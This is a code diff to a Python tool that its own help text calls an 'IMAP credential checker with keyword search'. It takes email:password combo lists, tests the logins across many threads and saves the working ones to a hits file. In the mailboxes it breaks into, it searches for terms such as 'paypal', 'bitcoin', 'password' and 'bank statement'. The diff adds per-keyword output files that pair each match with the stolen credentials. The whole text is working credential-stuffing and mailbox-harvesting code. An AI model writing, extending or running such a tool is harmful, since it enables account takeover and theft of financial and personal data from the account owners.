@@ -108,7 +108,6 @@ def search_keywords(host: str, port: int, user: str, password: str,
                                   timeout=timeout)
         conn.login(user, password)
 
-        # Collect folder names
         folders = ["INBOX"]
         try:
             _, raw_list = conn.list()
@@ -116,7 +115,6 @@ def search_keywords(host: str, port: int, user: str, password: str,
                 if not item:
                     continue
                 decoded = item.decode(errors="replace")
-                # folder name is the last quoted or unquoted token
                 m = re.search(r'"([^"]+)"\s*$|(\S+)\s*$', decoded)
                 if m:
                     folder = (m.group(1) or m.group(2)).strip().strip('"')
@@ -125,7 +123,7 @@ def search_keywords(host: str, port: int, user: str, password: str,
         except Exception:
             pass
 
-        for folder in folders[:8]:  # cap to avoid very large mailboxes
+        for folder in folders[:8]:
             try:
                 conn.select(folder, readonly=True)
             except Exception:
@@ -136,7 +134,7 @@ def search_keywords(host: str, port: int, user: str, password: str,
                     try:
                         _, ids_raw = conn.search(None, criterion)
                         msg_ids = ids_raw[0].split() if ids_raw and ids_raw[0] else []
-                        for mid in msg_ids[:5]:  # max 5 per keyword/criterion
+                        for mid in msg_ids[:5]:
                             try:
                                 _, data = conn.fetch(
                                     mid,
@@ -170,13 +168,13 @@ def search_keywords(host: str, port: int, user: str, password: str,
 
 def check_account(line: str, idx: int, total: int,
                   keywords: list[str], timeout: int,
-                  hits_fh, invalids_fh, keywords_fh,
+                  hits_fh, invalids_fh,
+                  kw_files: dict,
                   stats: dict):
     line = line.strip()
     if not line or ":" not in line:
         return
 
-    # Split on first colon only (passwords may contain colons)
     email, _, password = line.partition(":")
     email = email.strip()
     password = password.strip()
@@ -197,9 +195,6 @@ def check_account(line: str, idx: int, total: int,
     host, port = cfg["host"], cfg["port"]
     ok, err = imap_login(host, port, email, password, timeout)
 
-    with _print_lock:
-        hits = stats["hits"]
-
     if ok:
         with _print_lock:
             stats["hits"] += 1
@@ -212,19 +207,22 @@ def check_account(line: str, idx: int, total: int,
             hits_fh.write(f"{email}:{password}\n")
             hits_fh.flush()
 
-        # Keyword search for valid accounts
-        if keywords:
+        if keywords and kw_files:
             found = search_keywords(host, port, email, password, keywords, timeout + 10)
-            if found and keywords_fh:
+            if found:
+                kw_counts: dict[str, int] = {}
                 with _print_lock:
-                    keywords_fh.write(f"\n=== {email} ===\n")
                     for m in found:
-                        keywords_fh.write(
-                            f"  [{m['keyword']}] {m['folder']} | "
-                            f"FROM: {m['from']} | SUBJ: {m['subject']}\n"
-                        )
-                    keywords_fh.flush()
-                cprint(f"    {CYAN}↳ {len(found)} keyword match(es) saved{RESET}")
+                        fh = kw_files.get(m["keyword"])
+                        if fh:
+                            fh.write(
+                                f"{email}:{password} | {m['folder']} | "
+                                f"FROM: {m['from']} | SUBJ: {m['subject']}\n"
+                            )
+                            fh.flush()
+                        kw_counts[m["keyword"]] = kw_counts.get(m["keyword"], 0) + 1
+                summary = ", ".join(f"{k}:{v}" for k, v in kw_counts.items())
+                cprint(f"    {CYAN}↳ keywords found: {summary}{RESET}")
     else:
         with _print_lock:
             stats["invalids"] += 1
@@ -244,6 +242,11 @@ def banner():
 """)
 
 
+def safe_filename(name: str) -> str:
+    """Sanitize a keyword into a safe filename."""
+    return re.sub(r'[^\w\-]', '_', name).strip("_") or "keyword"
+
+
 def parse_args():
     p = argparse.ArgumentParser(
         description="IMAP credential checker with keyword search",
@@ -253,7 +256,7 @@ Examples:
   python checker.py accounts.txt
   python checker.py accounts.txt -t 30 --timeout 8
   python checker.py accounts.txt -k "paypal,bitcoin,invoice" -o results/
-  python checker.py accounts.txt -t 50 -k "password,bank statement"
+  python checker.py accounts.txt -t 50 -k "password,bank statement" -n moncheck
         """
     )
     p.add_argument("input", help="File with email:password lines")
@@ -264,7 +267,9 @@ Examples:
     p.add_argument("-k", "--keywords",
                    help="Comma-separated keywords to search in valid mailboxes")
     p.add_argument("-o", "--output", default="results",
-                   help="Output directory (default: results/)")
+                   help="Base output directory (default: results/)")
+    p.add_argument("-n", "--name",
+                   help="Run name override (default: timestamp)")
     return p.parse_args()
 
 
@@ -287,46 +292,58 @@ def main():
     keywords = [k.strip() for k in args.keywords.split(",") if k.strip()] \
         if args.keywords else []
 
-    out_dir = Path(args.output)
-    out_dir.mkdir(parents=True, exist_ok=True)
+    # Timestamped run directory
+    run_name = args.name if args.name else datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+    run_dir  = Path(args.output) / run_name
+    run_dir.mkdir(parents=True, exist_ok=True)
 
-    hits_path     = out_dir / "hits.txt"
-    invalids_path = out_dir / "invalids.txt"
-    kw_path       = out_dir / "keywords.txt" if keywords else None
+    hits_path     = run_dir / "hits.txt"
+    invalids_path = run_dir / "invalids.txt"
+
+    # One file per keyword inside keywords/
+    kw_dir   = run_dir / "keywords" if keywords else None
+    kw_files = {}
+    if kw_dir:
+        kw_dir.mkdir(exist_ok=True)
+        for kw in keywords:
+            kw_files[kw] = open(kw_dir / f"{safe_filename(kw)}.txt", "w")
 
     print(f"  {BOLD}Input   {RESET}: {input_path} ({len(lines)} accounts)")
     print(f"  {BOLD}Threads {RESET}: {args.threads}")
     print(f"  {BOLD}Timeout {RESET}: {args.timeout}s")
     if keywords:
         print(f"  {BOLD}Keywords{RESET}: {', '.join(keywords)}")
-    print(f"  {BOLD}Output  {RESET}: {out_dir}/\n")
+    print(f"  {BOLD}Run dir {RESET}: {run_dir}/\n")
 
     stats = {"hits": 0, "invalids": 0, "errors": 0, "unknown": 0}
     start = time.time()
 
-    with (open(hits_path,     "w") as hits_fh,
-          open(invalids_path, "w") as invalids_fh,
-          (open(kw_path, "w") if kw_path else open(os.devnull, "w")) as kw_fh):
+    try:
+        with (open(hits_path, "w") as hits_fh,
+              open(invalids_path, "w") as invalids_fh):
 
-        with ThreadPoolExecutor(max_workers=args.threads) as pool:
-            futures = {
-                pool.submit(
-                    check_account,
-                    line, idx + 1, len(lines),
-                    keywords, args.timeout,
-                    hits_fh, invalids_fh,
-                    kw_fh if kw_path else None,
-                    stats
-                ): line
-                for idx, line in enumerate(lines)
-            }
-            for f in as_completed(futures):
-                try:
-                    f.result()
-                except Exception as e:
-                    with _print_lock:
-                        stats["errors"] += 1
-                    cprint(f"{RED}Worker error: {e}{RESET}")
+            with ThreadPoolExecutor(max_workers=args.threads) as pool:
+                futures = {
+                    pool.submit(
+                        check_account,
+                        line, idx + 1, len(lines),
+                        keywords, args.timeout,
+                        hits_fh, invalids_fh,
+                        kw_files,
+                        stats
+                    ): line
+                    for idx, line in enumerate(lines)
+                }
+                for f in as_completed(futures):
+                    try:
+                        f.result()
+                    except Exception as e:
+                        with _print_lock:
+                            stats["errors"] += 1
+                        cprint(f"{RED}Worker error: {e}{RESET}")
+    finally:
+        for fh in kw_files.values():
+            fh.close()
 
     elapsed = time.time() - start
     total_checked = stats["hits"] + stats["invalids"] + stats["unknown"] + stats["errors"]
@@ -342,8 +359,12 @@ def main():
 
   {BOLD}hits.txt    {RESET}→ {hits_path}
   {BOLD}invalids.txt{RESET}→ {invalids_path}""")
-    if kw_path and stats["hits"]:
-        print(f"  {BOLD}keywords.txt{RESET}→ {kw_path}")
+    if kw_dir:
+        print(f"  {BOLD}keywords/   {RESET}→ {kw_dir}/")
+        for kw in kw_files:
+            kw_path = kw_dir / f"{safe_filename(kw)}.txt"
+            size = kw_path.stat().st_size if kw_path.exists() else 0
+            print(f"               {DIM}{safe_filename(kw)}.txt  ({size} bytes){RESET}")
     print()
 
 
